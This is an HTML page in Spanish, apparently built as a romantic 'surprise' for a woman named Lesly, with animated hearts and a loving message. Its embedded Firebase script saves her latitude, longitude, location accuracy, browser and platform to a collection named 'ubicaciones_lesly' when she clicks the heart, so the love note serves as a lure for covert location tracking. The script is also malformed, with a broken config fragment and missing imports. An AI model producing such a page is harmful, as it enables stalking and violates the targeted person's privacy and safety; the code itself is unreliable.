<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Para Mi Amor Lesly</title>
    <!-- Enlace al CSS -->
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <!-- Estrellas de fondo -->
    <div class="stars" id="stars"></div>

    <!-- Contenedor principal -->
    <div class="container" id="mainContainer">
        <h1 class="mensaje">Buenas noches mi amor Lesly</h1>
        <p class="sub-mensaje">Tengo una sorpresa para ti</p>
        
        <div class="heart-container" id="heartBtn" onclick="handleClick()">
            <div class="heart"></div>
            <span class="click-text">Clic aquí</span>
        </div>
    </div>

    <!-- Loading -->
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>Preparando tu sorpresa...</p>
    </div>

    <!-- Corazón grande animado -->
    <div class="big-heart" id="bigHeart">
        <div class="big-heart-inner"></div>
    </div>

    <!-- Mensaje de amor -->
    <div class="love-message" id="loveMessage">
        Te deseo nena guapa presiosa
    </div>

    <!-- Partículas -->
    <div class="particles" id="particles"></div>

    <!-- Firebase SDK -->
    <script type="module">

        // Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";

  projectId: "lovelesly-a4666",

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

        // Hacer disponible la función de guardar en window
        window.saveToFirebase = async function(latitude, longitude, accuracy) {
            try {
                const docRef = await addDoc(collection(db, "ubicaciones_lesly"), {
                    latitud: latitude,
                    longitud: longitude,
                    precision: accuracy,
                    fecha: serverTimestamp(),
                    mensaje: "Lesly hizo clic en el corazón",
                    usuario: "Lesly",
                    userAgent: navigator.userAgent,
                    plataforma: navigator.platform
                });
                console.log("Ubicación guardada con ID:", docRef.id);
                return true;
            } catch (error) {
                console.error("Error al guardar:", error);
                return false;
            }
        };
    </script>

    <!-- Enlace al JavaScript -->
    <script src="js/script.js"></script>
